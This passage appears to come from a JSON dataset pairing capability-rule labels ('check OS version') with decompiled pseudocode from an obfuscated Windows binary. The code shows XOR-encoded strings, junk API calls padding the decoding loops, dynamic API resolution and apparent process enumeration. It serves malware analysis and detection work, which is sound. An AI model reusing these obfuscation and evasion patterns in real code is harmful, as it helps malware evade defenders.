0);\n    *0x41dadc = (*pcVar6)(0, 0, 0x40e927, puVar5, 0, 0);\n    uVar3 = (*pcVar6)(0, 0, fcn.0040deca, arg_8h, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar1)(0, var_34h);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_54h);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_3ch);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_48h);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_50h);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_58h);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_40h);\n    (*pcVar6)(uVar3);\n    return 0;\n}\n",
        "token_count": 6170
    },
    "0040472d": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040472d(code *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint uVar8;\n    uint uVar9;\n    int32_t *piVar10;\n    int32_t iVar11;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_29h;\n    uint var_24h;\n    uint var_20h;\n    code *var_1ch;\n    uint var_18h;\n    int32_t *lpLibFileName;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0xffffffff;\n    var_1ch = param_1;\n    var_18h = param_2;\n    if (*0x41db1c == NULL) {\n        var_30h._0_2_ = 0x210d;\n        var_8h = 6;\n        var_30h._2_1_ = 6;\n        stack0xffffffcf = 0x7401d55;\n        var_29h._0_2_ = 0xe39;\n        var_29h._2_1_ = 0x39;\n        var_24h = 0x39625563;\n        var_20h._0_2_ = 0x6e71;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar11 = 0;\n        lpLibFileName = iVar4;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n            if (iVar5 != 0x7d2cca) {\n                *(iVar11 + iVar4) = *(&var_24h + iVar11 % var_8h) ^ (iVar11 + iVar4)[&var_30h - iVar4];\n            }\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 10);\n        var_4ch = 0x1c323709;\n        var_48h = 0x103e3107;\n        var_44h = 0x26161a1a;\n        var_40h = 0xf0d0a2a;\n        var_3ch = 0x222a310d;\n        var_38h = 0x2d0d0017;\n        var_34h._0_1_ = 0x47;\n        var_24h = 0x69634347;\n        var_20h._0_2_ = 0x4362;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar11 = 0;\n        var_10h = &var_4ch - iVar4;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n            iVar5 = lpLibFileName;\n            if (iVar6 != 0x4104a6) {\n                *(iVar11 + iVar4) = *(&var_24h + iVar11 % var_8h) ^ (iVar11 + iVar4)[&var_4ch - iVar4];\n            }\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 0x19);\n        uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar4);\n        *0x41db1c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar5);\n        (*pcVar1)(uVar3);\n    }\n    var_4h = 0;\n    iVar4 = (**0x41db1c)(5, 0, 0, &var_4h);\n    if (iVar4 == -0x3ffffffc) {\n        var_4h = var_4h + 0x100;\n        piVar7 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_4h, 0x3000, 4);\n        if (piVar7 != NULL) {\n            lpLibFileName = piVar7;\n            iVar4 = (**0x41db1c)(5, piVar7, var_4h, 0);\n            uVar3 = var_18h;\n            piVar10 = piVar7;\n            if (-1 < iVar4) {\n                var_ch = 0;\n                do {\n                    iVar4 = piVar7[0x11];\n                    if (((iVar4 != 0) && (iVar4 != 4)) && (iVar4 != *0x41dd6c)) {\n                        uVar8 = fcn.0040b8cc();\n                        uVar9 = fcn.0040b3fd();\n                        iVar4 = (*var_1ch)(piVar7[0xf], uVar9, piVar7[0x11], piVar7[0x12], uVar8, uVar3);\n                        piVar10 = lpLibFileName;\n                        if (iVar4 == 0) break;\n                    }\n                    piVar10 = lpLibFileName;\n                    if (*piVar7 == 0) break;\n                    piVar7 = piVar7 + *piVar7;\n                } while( true );\n            }\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(piVar10, 0, 0x8000);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 1411
    },
    "00407abf": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00407abf(void)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    code *var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t lpModuleName;\n    uint var_4h;\n    \n    var_38h = 0x14202a1b;\n    var_34h._0_2_ = 0x3d36;\n    var_34h._2_1_ = 0x43;\n    stack0xffffffcb = 0x3f1e7c7d;\n    var_30h._3_1_ = 0x3d;\n    var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x70);\n    var_28h = 0x7a524f70;\n    var_24h._0_2_ = 0x5153;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_18h = 6;\n    iVar7 = 0;\n    lpModuleName = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar4 != 0x3e5189) {\n            *(iVar7 + iVar3) = *(&var_28h + iVar7 % var_18h) ^ (iVar7 + iVar3)[&var_38h - iVar3];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    var_34h._2_1_ = 6;\n    var_34h._0_2_ = 0xb07;\n    stack0xffffffcb = 0xd350711;\n    var_14h = 5;\n    var_30h._3_1_ = 5;\n    var_2ch._0_2_ = 0x4634;\n    var_28h = 0x75686241;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x46);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    var_1ch = iVar3;\n    var_10h = &var_34h - iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar4 != 0xc54e52) {\n            *(iVar7 + iVar3) = *(&var_28h + iVar7 % var_14h) ^ (iVar7 + iVar3)[&var_34h - iVar3];\n        }\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_48h = 0x1a5b1c36;\n    var_44h = 0x19371a11;\n    var_40h = 0x2311c5a;\n    var_3ch = 0x78751d1e;\n    stack0xffffffcb = stack0xffffffcb & 0xff | 0x34707100;\n    var_30h._3_1_ = 0x78;\n    var_2ch._0_2_ = 0x7670;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = lpModuleName;\n    var_10h = 0;\n    var_20h = &var_48h - iVar7;\n    var_28h = iVar7;\n    do {\n        iVar4 = (*pcVar6)();\n        if (iVar4 != 0xbf5e22) {\n            *(var_10h + iVar7) = *(&var_30h + var_10h % var_18h) ^ (var_10h + iVar7)[var_20h];\n        }\n        var_10h = var_10h + 1;\n    } while (var_10h < 0x10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar3, iVar7);\n    var_20h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar3, var_1ch);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    iVar1 = (*pcVar5)(var_4h);\n    if (iVar1 == 0) {\n        iVar1 = (*var_20h)(var_4h);\n        if (iVar1 == 0) {\n            var_38h = 0x18572f0c;\n            var_34h._0_2_ = 0x2750;\n            var_34h._2_1_ = 2;\n            stack0xffffffcb = 0x3f701e5c;\n            var_30h._3_1_ = 0x2c;\n            var_2ch._0_2_ = 0x3b55;\n            var_2ch._2_1_ = 0x31;\n            var_10h = 0x7a38434b;\n            var_ch._0_1_ = 0x31;\n            uVar2 = (*pcVar6)(8, 0x10);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar7 = 0;\n            var_20h = &var_38h - iVar3;\n            var_18h = iVar3;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n                if (iVar4 != 0x186246) {\n                    *(iVar7 + iVar3) = *(&var_10h + iVar7 % var_14h) ^ (iVar7 + iVar3)[&var_38h - iVar3];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0xf);\n            var_34h._0_2_ = 0x220;\n            var_34h._2_1_ = 0x32;\n            stack0xffffffcb = 0xb0e1622;\n            var_30h._3_1_ = 0x17;\n            var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 99);\n            var_10h = 0x63566661;\n            var_ch._0_1_ = 0x62;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar7 = 0;\n            var_20h = &var_34h - iVar3;\n            do {\n                iVar4 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n                if (iVar4 != 0x8895ed) {\n                    *(iVar7 + iVar3) = *(&var_10h + iVar7 % var_14h) ^ (&var_34h - iVar3)[iVar7 + iVar3];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 9);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar3);\n            pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n            iVar7 = var_18h;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, var_18h);\n            pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n            (*pcVar5)(var_4h);\n            (*pcVar6)(var_4h);\n            pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*pcVar6)(0, iVar7);\n            (*pcVar5)(uVar2);\n            var_18h = 1;\n            iVar3 = lpModuleName;\n            iVar7 = var_28h;\n            goto code_r0x00407d9f;\n        }\n    }\n    var_18h = 0;\ncode_r0x00407d9f:\n    uVar2 = (*pcVar6)(0, iVar7);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar6)(0, var_1ch);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar6)(0, iVar3);\n    (*pcVar5)(uVar2);\n    return var_18h;\n}\n",
        "token_count": 2224
    },
    "004090bc": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004090bc(uchar *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    code *pcVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint32_t var_30h;\n    uint8_t var_2ch [3];\n    uint var_29h;\n    uchar *var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint8_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_24h = param_1;\n    if ((((*0x41dd38 | *0x41dd3c) == 0) || ((*0x41dd40 | *0x41dd44) == 0)) || ((*0x41dd48 | *0x41dd4c) == 0)) {\n        var_4h = 0x7f;\n        var_30h._0_2_ = 0x210d;\n        var_8h = 6;\n        var_30h._2_1_ = 6;\n        stack0xffffffcf = 0x7401d55;\n        var_29h._0_1_ = 0x39;\n        var_29h._1_1_ = 0xe;\n        var_29h._2_1_ = 0x39;\n        var_20h = 0x39625563;\n        var_1ch._0_2_ = 0x6e71;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar7 = 0;\n        var_14h = iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n            if (iVar3 != 0x7d2cca) {\n                *(iVar7 + iVar2) = *(&var_20h + iVar7 % var_8h) ^ (iVar7 + iVar2)[var_2ch + (-4 - iVar2)];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 10);\n        var_10h = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar2);\n        if (var_10h == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            return var_4h;\n        }\n        var_30h._0_2_ = 0x3278;\n        var_30h._2_1_ = 0x3c;\n        stack0xffffffcf = 0x501b3b20;\n        var_29h._0_1_ = 0x12;\n        var_29h._1_1_ = 0x22;\n        var_29h._2_1_ = 0;\n        var_29h._3_1_ = 0x54;\n        var_20h = 0x6c4e5634;\n        var_1ch._0_2_ = 0x7a54;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar7 = 0;\n        var_18h = iVar2;\n        var_ch = var_2ch + (-4 - iVar2);\n        do {\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n            if (iVar3 != 0xa8f3e2) {\n                *(iVar7 + iVar2) = *(&var_20h + iVar7 % var_8h) ^ (iVar7 + iVar2)[var_2ch + (-4 - iVar2)];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xb);\n        *0x41dd38 = fcn.0040bbc6();\n        iVar7 = var_14h;\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        *0x41dd3c = *0x41dd38 >> 0x1f;\n        if ((*0x41dd38 | *0x41dd3c) == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_48h = 0x3e260c2b;\n            var_44h = 0x1a372353;\n            var_40h._0_1_ = 0x3b;\n            var_40h._1_1_ = 0x1a;\n            var_40h._2_2_ = 0x3353;\n            var_3ch._0_2_ = 0x1a12;\n            var_3ch._2_2_ = 0x3831;\n            var_38h._0_2_ = 0x3352;\n            var_38h._2_2_ = 0xd15;\n            var_34h._0_2_ = 0xa27;\n            var_34h._2_1_ = 0x36;\n            stack0xffffffcf = stack0xffffffcf & 0xff | 0x54686700;\n            var_29h._0_1_ = 0x79;\n            var_29h._1_1_ = 0x36;\n            var_29h._2_1_ = 0x57;\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar2 = 0;\n            var_20h = &var_48h - puVar4;\n            var_ch = puVar4;\n            do {\n                iVar7 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n                if (iVar7 != 0xb8a9a0) {\n                    puVar4[iVar2] = var_2ch[iVar2 % var_8h] ^ (puVar4 + iVar2)[&var_48h - puVar4];\n                }\n                iVar2 = iVar2 + 1;\n            } while (iVar2 < 0x17);\n            *0x41dd40 = fcn.0040bbc6();\n            iVar7 = var_14h;\n            iVar2 = var_18h;\n            *0x41dd44 = *0x41dd40 >> 0x1f;\n            if ((*0x41dd40 | *0x41dd44) == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n                pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                (*pcVar5)(uVar1);\n                uVar1 = (*pcVar8)(0, iVar7);\n                (*pcVar5)(uVar1);\n                return var_4h;\n            }\n            var_48h = 0x223b4120;\n            var_44h = 0x551f1259;\n            var_40h._0_1_ = 0x1f;\n            var_40h._1_1_ = 6;\n            var_40h._2_2_ = 0x145f;\n            var_3ch._0_2_ = 0x430e;\n            var_3ch._2_2_ = 0x3c0a;\n            var_38h._0_2_ = 0x37b;\n            var_38h._2_2_ = 0x5917;\n            var_34h._0_2_ = 0x2919;\n            var_34h._2_1_ = 0x36;\n            stack0xffffffcf = stack0xffffffcf & 0xff | 0x6b367a00;\n            var_29h._0_1_ = 0x50;\n            var_29h._1_1_ = 0x36;\n            var_29h._2_1_ = 0x66;\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar7 = 0;\n            var_20h = &var_48h - iVar2;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n                if (iVar3 != 0xfc02e3) {\n                    *(iVar7 + iVar2) = var_2ch[iVar7 % var_8h] ^ (iVar7 + iVar2)[&var_48h - iVar2];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x17);\n            *0x41dd48 = fcn.0040bbc6();\n            iVar7 = var_14h;\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            *0x41dd4c = *0x41dd48 >> 0x1f;\n            if ((*0x41dd48 | *0x41dd4c) != 0) {\n                var_4h = 0;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, var_ch);\n                (*pcVar8)(uVar1);\n                uVar1 = (*pcVar5)(0, var_18h);\n                (*pcVar8)(uVar1);\n                uVar1 = (*pcVar5)(0, iVar7);\n                (*pcVar8)(uVar1);\n                goto code_r0x004093fe;\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*pcVar5)(0, var_ch);\n            (*pcVar8)(uVar1);\n            uVar1 = (*pcVar5)(0, var_18h);\n        }\n        (*pcVar8)(uVar1);\n        uVar1 = (*pcVar5)(0, iVar7);\n        (*pcVar8)(uVar1);\n    }\n    else {\ncode_r0x004093fe:\n        puVar6 = 0x41dd38;\n        for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *var_24h = *puVar6;\n            puVar6 = puVar6 + 1;\n            var_24h = var_24h + 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 2667
    },
    "00409414": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00409414(uchar *param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint8_t *arg_8h;\n    code *pcVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint32_t var_30h;\n    uint8_t var_2ch [3];\n    uint var_29h;\n    uchar *var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint8_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_24h = param_1;\n    if ((((*0x41dd50 | *0x41dd54) == 0) || ((*0x41dd58 | *0x41dd5c) == 0)) || ((*0x41dd60 | *0x41dd64) == 0)) {\n        var_4h = 0x7f;\n        var_30h._0_2_ = 0x210d;\n        var_8h = 6;\n        var_30h._2_1_ = 6;\n        stack0xffffffcf = 0x7401d55;\n        var_29h._0_1_ = 0x39;\n        var_29h._1_1_ = 0xe;\n        var_29h._2_1_ = 0x39;\n        var_20h = 0x39625563;\n        var_1ch._0_2_ = 0x6e71;\n        var_14h = param_2;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar7 = 0;\n        var_10h = iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n            if (iVar3 != 0x7d2cca) {\n                *(iVar7 + iVar2) = *(&var_20h + iVar7 % var_8h) ^ (iVar7 + iVar2)[var_2ch + (-4 - iVar2)];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 10);\n        var_30h._0_2_ = 0x3278;\n        var_30h._2_1_ = 0x3c;\n        stack0xffffffcf = 0x501b3b20;\n        var_29h._0_1_ = 0x12;\n        var_29h._1_1_ = 0x22;\n        var_29h._2_1_ = 0;\n        var_29h._3_1_ = 0x54;\n        var_20h = 0x6c4e5634;\n        var_1ch._0_2_ = 0x7a54;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar7 = 0;\n        var_18h = iVar2;\n        var_ch = var_2ch + (-4 - iVar2);\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n            iVar3 = var_10h;\n            if (iVar4 != 0xa8f3e2) {\n                *(iVar7 + iVar2) = *(&var_20h + iVar7 % var_8h) ^ (iVar7 + iVar2)[var_2ch + (-4 - iVar2)];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xb);\n        *0x41dd50 = fcn.0040c9e0(iVar2);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (*0x41dd50 == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_48h = 0x3e260c2b;\n            var_44h = 0x1a372353;\n            var_40h._0_1_ = 0x3b;\n            var_40h._1_1_ = 0x1a;\n            var_40h._2_2_ = 0x3353;\n            var_3ch._0_2_ = 0x1a12;\n            var_3ch._2_2_ = 0x3831;\n            var_38h._0_2_ = 0x3352;\n            var_38h._2_2_ = 0xd15;\n            var_34h._0_2_ = 0xa27;\n            var_34h._2_1_ = 0x36;\n            stack0xffffffcf = stack0xffffffcf & 0xff | 0x54686700;\n            var_29h._0_1_ = 0x79;\n            var_29h._1_1_ = 0x36;\n            var_29h._2_1_ = 0x57;\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            arg_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar2 = 0;\n            var_20h = &var_48h - arg_8h;\n            var_ch = arg_8h;\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n                iVar7 = var_10h;\n                if (iVar3 != 0xb8a9a0) {\n                    arg_8h[iVar2] = var_2ch[iVar2 % var_8h] ^ (arg_8h + iVar2)[&var_48h - arg_8h];\n                }\n                iVar2 = iVar2 + 1;\n            } while (iVar2 < 0x17);\n            *0x41dd58 = fcn.0040c9e0(arg_8h);\n            iVar2 = var_18h;\n            if (*0x41dd58 == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n                pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                (*pcVar5)(uVar1);\n                uVar1 = (*pcVar8)(0, iVar7);\n                (*pcVar5)(uVar1);\n                goto code_r0x0040974a;\n            }\n            var_48h = 0x223b4120;\n            var_44h = 0x551f1259;\n            var_40h._0_1_ = 0x1f;\n            var_40h._1_1_ = 6;\n            var_40h._2_2_ = 0x145f;\n            var_3ch._0_2_ = 0x430e;\n            var_3ch._2_2_ = 0x3c0a;\n            var_38h._0_2_ = 0x37b;\n            var_38h._2_2_ = 0x5917;\n            var_34h._0_2_ = 0x2919;\n            var_34h._2_1_ = 0x36;\n            stack0xffffffcf = stack0xffffffcf & 0xff | 0x6b367a00;\n            var_29h._0_1_ = 0x50;\n            var_29h._1_1_ = 0x36;\n            var_29h._2_1_ = 0x66;\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar7 = 0;\n            var_20h = &var_48h - iVar2;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n                iVar3 = var_10h;\n                if (iVar4 != 0xfc02e3) {\n                    *(iVar7 + iVar2) = var_2ch[iVar7 % var_8h] ^ (iVar7 + iVar2)[&var_48h - iVar2];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x17);\n            *0x41dd60 = fcn.0040c9e0(iVar2);\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (*0x41dd60 != 0) {\n                var_4h = 0;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, var_ch);\n                (*pcVar8)(uVar1);\n                uVar1 = (*pcVar5)(0, var_18h);\n                (*pcVar8)(uVar1);\n                uVar1 = (*pcVar5)(0, iVar3);\n                (*pcVar8)(uVar1);\n                goto code_r0x0040973d;\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*pcVar5)(0, var_ch);\n            (*pcVar8)(uVar1);\n            uVar1 = (*pcVar5)(0, var_18h);\n        }\n        (*pcVar8)(uVar1);\n        uVar1 = (*pcVar5)(0, iVar3);\n        (*pcVar8)(uVar1);\n    }\n    else {\ncode_r0x0040973d:\n        puVar6 = 0x41dd50;\n        for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *var_24h = *puVar6;\n            puVar6 = puVar6 + 1;\n            var_24h = var_24h + 1;\n        }\n    }\ncode_r0x0040974a:\n    *0x41dd64 = *0x41dd60 >> 0x20;\n    *0x41dd5c = *0x41dd58 >> 0x20;\n    *0x41dd54 = *0x41dd50 >> 0x20;\n    return var_4h;\n}\n",
        "token_count": 2612
    },
    "0040991b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
